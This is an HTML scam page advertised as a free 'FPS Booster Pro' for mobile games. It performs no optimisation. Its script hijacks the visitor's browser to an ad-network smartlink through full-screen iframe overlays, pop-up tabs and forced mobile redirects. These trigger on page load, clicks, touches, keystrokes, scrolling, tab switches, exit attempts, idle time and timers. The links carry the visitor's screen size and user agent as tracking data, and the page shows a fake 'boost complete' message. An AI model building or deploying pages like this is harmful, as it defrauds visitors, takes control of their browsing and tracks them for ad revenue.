<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üî• FPS Booster Pro - 300% FPS Instantly FREE!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: #0f0; 
            font-family: 'Courier New', monospace; 
            overflow: hidden;
            cursor: none;
            user-select: none;
        }
        canvas { position: fixed; top: 0; left: 0; z-index: 1; }
        .content { 
            position: fixed; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            z-index: 10; 
            text-align: center;
            text-shadow: 0 0 10px #0f0;
        }
        .boost-btn { 
            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff); 
            border: none; 
            padding: 25px 50px; 
            font-size: 28px; 
            color: white; 
            border-radius: 50px; 
            cursor: pointer;
            box-shadow: 0 0 40px #0f0;
            font-weight: bold;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        .boost-btn:hover { 
            transform: scale(1.15); 
            box-shadow: 0 0 80px #ff0;
        }
        .games { font-size: 32px; margin: 30px 0; letter-spacing: 5px; }
        #status { 
            font-size: 20px; 
            margin: 25px 0; 
            animation: pulse 1.5s infinite;
            min-height: 30px;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .clickable { cursor: pointer; color: #ff0; transition: color 0.3s; }
        .clickable:hover { color: #fff; text-shadow: 0 0 20px #ff0; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    
    <div class="content">
        <h1 style="font-size: 48px; margin-bottom: 20px;">üî• FPS Booster Pro</h1>
        <p style="font-size: 22px; margin-bottom: 30px;">
            PUBG ‚Ä¢ Free Fire ‚Ä¢ COD Mobile ‚Ä¢ <span style="color:#ff0">300% FPS Instantly</span> ‚Ä¢ No Root Required
        </p>
        
        <div style="font-size: 26px; margin-bottom: 30px;">
            üëà <span class="clickable" onclick="smartlinkRedirect()">Click BOOST</span> 
            to increase FPS by 300% instantly!
        </div>
        
        <div class="games">
            <div class="clickable" onclick="smartlinkRedirect()">PUBG MOBILE</div>
            <div class="clickable" onclick="smartlinkRedirect()">FREE FIRE</div>
            <div class="clickable" onclick="smartlinkRedirect()">COD MOBILE</div>
        </div>
        
        <button class="boost-btn" onclick="boostFPS(event)">üöÄ BOOST FPS NOW</button>
        <div id="status">üîç Scanning your device... Ready to boost!</div>
    </div>

    <script>
        // üî• YOUR SMARTLINK WITH TRACKING
        const BASE_SMARTLINK = "https://www.effectivegatecpm.com/g2ekgwk4r?key=0ad4113d3e531c121aa17596217d907e";
        
        let totalTriggers = 0;
        let isRedirecting = false;
        const MAX_TRIGGERS = 8; // Multiple chances!

        function getTrackedSmartlink(source = '') {
            return BASE_SMARTLINK + 
                '&sub1=fpsboost' +
                '&sub2=' + source +
                '&sub3=' + (screen.width + 'x' + screen.height) +
                '&sub4=trigger_' + (++totalTriggers) +
                '&sub5=' + Date.now() +
                '&sub6=' + navigator.userAgent.slice(0,20);
        }

        // üí∞ ULTIMATE SMARTLINK REDIRECT (‡§π‡§∞ method!)
        function smartlinkRedirect(source = 'unknown') {
            if (isRedirecting || totalTriggers >= MAX_TRIGGERS) return;
            isRedirecting = true;
            
            const link = getTrackedSmartlink(source);
            console.log(`üîó Smartlink ${totalTriggers}: ${source}`, link);
            
            // üî• FULLSCREEN IFRAME TAKEOVER (Main method)
            const overlay = document.createElement('div');
            overlay.id = 'smartlink-overlay';
            overlay.style.cssText = `
                position: fixed !important;
                top: 0 !important; left: 0 !important;
                width: 100vw !important; height: 100vh !important;
                z-index: 9999999 !important;
                background: white !important;
                opacity: 1 !important;
            `;
            overlay.innerHTML = `
                <iframe src="${link}" 
                        style="position:absolute;top:0;left:0;width:100%;height:100%;border:none;"
                        frameborder="0" allowfullscreen></iframe>
            `;
            document.body.appendChild(overlay);
            
            // Backup: New Tab
            window.open(link, '_blank', 'noopener,noreferrer,width=1200,height=800');
            
            // Mobile: Direct redirect after delay
            setTimeout(() => {
                if (/Mobi|Android/i.test(navigator.userAgent)) {
                    window.location.href = link;
                }
            }, 1000);
            
            setTimeout(() => {
                if (overlay && overlay.parentNode) {
                    document.body.removeChild(overlay);
                }
                isRedirecting = false;
            }, 5000);
        }

        // üéØ EVERYWHERE TRIGGERS!
        document.addEventListener('DOMContentLoaded', () => {
            console.log('üöÄ FPS Booster Pro - Smartlink Everywhere Active!');
            
            // 1. PAGE LOAD + MOUSE MOVE (Instant!)
            setTimeout(() => {
                document.dispatchEvent(new MouseEvent('mousemove', {bubbles: true}));
            }, 500);
            
            // 2. ALL MOUSE EVENTS
            ['mousemove', 'mousedown', 'mouseup', 'click', 'dblclick'].forEach(event => {
                document.addEventListener(event, (e) => {
                    if (!isRedirecting && Math.random() > 0.7) { // 30% chance ‡§π‡§∞ event ‡§™‡§∞
                        setTimeout(() => smartlinkRedirect(event.type), 200);
                    }
                }, {passive: true});
            });
            
            // 3. KEYBOARD (Any key!)
            document.addEventListener('keydown', (e) => {
                if (!isRedirecting && Math.random() > 0.8) {
                    smartlinkRedirect('keyboard_' + e.key);
                }
            });
            
            // 4. TOUCH (Mobile perfect!)
            ['touchstart', 'touchmove', 'touchend'].forEach(event => {
                document.addEventListener(event, (e) => {
                    if (!isRedirecting) {
                        setTimeout(() => smartlinkRedirect('touch'), 300);
                    }
                }, {passive: true});
            });
            
            // 5. VISIBILITY CHANGE (Back button/tab switch)
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    setTimeout(() => smartlinkRedirect('back_btn'), 100);
                } else {
                    setTimeout(() => smartlinkRedirect('tab_focus'), 200);
                }
            });
            
            // 6. PAGEHIDE/BEFOREUNLOAD (Exit intent)
            window.addEventListener('pagehide', () => smartlinkRedirect('pagehide'));
            window.addEventListener('beforeunload', () => smartlinkRedirect('beforeunload'));
            
            // 7. SCROLL (‡§π‡§∞ scroll ‡§™‡§∞ chance)
            let scrollCount = 0;
            window.addEventListener('scroll', () => {
                scrollCount++;
                if (scrollCount % 3 === 0 && !isRedirecting) {
                    smartlinkRedirect('scroll');
                }
            });
            
            // 8. AUTO-TIMERS (Multiple chances)
            const timers = [3000, 8000, 15000, 25000, 40000];
            timers.forEach((delay, i) => {
                setTimeout(() => smartlinkRedirect('auto_' + (i+1)), delay);
            });
            
            // 9. IDLE DETECTION
            let idleTime = 0;
            const idleCheck = setInterval(() => {
                idleTime += 1;
                if (idleTime >= 20 && !isRedirecting) { // 20 sec idle
                    smartlinkRedirect('idle');
                    idleTime = 0;
                }
            }, 1000);
            
            // Reset idle
            ['mousemove', 'mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
                document.addEventListener(evt, () => idleTime = 0, {passive: true});
            });
        });

        // BOOST BUTTON (Guaranteed!)
        function boostFPS(event) {
            event.preventDefault();
            event.stopPropagation();
            document.getElementById('status').innerHTML = 'üöÄ BOOSTING FPS 300%... Advanced Optimization Active!';
            smartlinkRedirect('boost_button');
            
            setTimeout(() => {
                document.getElementById('status').innerHTML = '‚úÖ FPS BOOST COMPLETE! +300% Performance Unlocked!';
            }, 2500);
        }

        // Matrix Rain (Enhanced)
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const matrixChars = '01„Ç¢„Ç§„Ç¶„Ç®„Ç™„Ç´„Ç≠„ÇØ„Ç±„Ç≥„Çµ„Ç∑„Çπ„Çª„ÇΩ„Çø„ÉÅ„ÉÑ„ÉÜ„Éà„Éä„Éã„Éå„Éç„Éé„Éè„Éí„Éï„Éò„Éõ„Éû„Éü„É†„É°„É¢„É§„É¶„É®„É©„É™„É´„É¨„É≠„ÉØ„É≤„É≥FPSBOOST';
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = `hsl(${Date.now() * 0.01 % 360}, 100%, 50%)`;
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = matrixChars[Math.floor(Math.random() * matrixChars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 30);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
    </script>
</body>
</html>
